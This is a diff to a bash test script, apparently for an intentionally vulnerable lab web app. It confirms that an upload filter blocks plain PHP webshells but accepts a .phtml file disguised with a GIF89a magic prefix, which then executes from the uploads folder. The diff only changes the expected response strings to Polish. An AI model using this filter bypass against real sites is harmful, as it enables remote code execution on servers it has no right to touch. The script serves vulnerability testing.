@@ -29,15 +29,15 @@ echo "== #2 upload -> webshell RCE =="
 # (a) obvious: bare .php webshell -> blocked by extension blacklist.
 printf '<?php echo "x";' > "$TMP/shell.php"
 r=$(curl -s -b "$PJAR" -F "file=@$(winpath "$TMP/shell.php");type=application/x-php" "$BASE/upload.php")
-echo "$r" | grep -q "Rejected" && pass "bare shell.php rejected" || fail "bare shell.php NOT rejected"
+echo "$r" | grep -q "Odrzucono" && pass "bare shell.php rejected" || fail "bare shell.php NOT rejected"
 # (b) .phtml without magic prefix -> blocked by content sniff (proves magic prefix needed).
 printf '<?php echo "x";' > "$TMP/plain.phtml"
 r=$(curl -s -b "$PJAR" -F "file=@$(winpath "$TMP/plain.phtml");type=image/gif" "$BASE/upload.php")
-echo "$r" | grep -q "Rejected" && pass "plain .phtml rejected (magic prefix required)" || fail "plain .phtml NOT rejected"
+echo "$r" | grep -q "Odrzucono" && pass "plain .phtml rejected (magic prefix required)" || fail "plain .phtml NOT rejected"
 # (c) bypass: .phtml + GIF89a polyglot -> uploaded AND executes from /uploads/.
 printf 'GIF89a<?php echo "PWNED".(21*2); ?>' > "$TMP/shell.phtml"
 r=$(curl -s -b "$PJAR" -F "file=@$(winpath "$TMP/shell.phtml");type=image/gif" "$BASE/upload.php")
-echo "$r" | grep -q "Uploaded" && pass "GIF89a .phtml polyglot accepted" || fail "GIF89a .phtml polyglot rejected"
+echo "$r" | grep -q "Przesłano" && pass "GIF89a .phtml polyglot accepted" || fail "GIF89a .phtml polyglot rejected"
 key=$(echo "$r" | grep -o 'att-[0-9]*-shell\.phtml' | head -1)
 if [ -n "$key" ]; then
   x=$(curl -s "$BASE/uploads/$key")
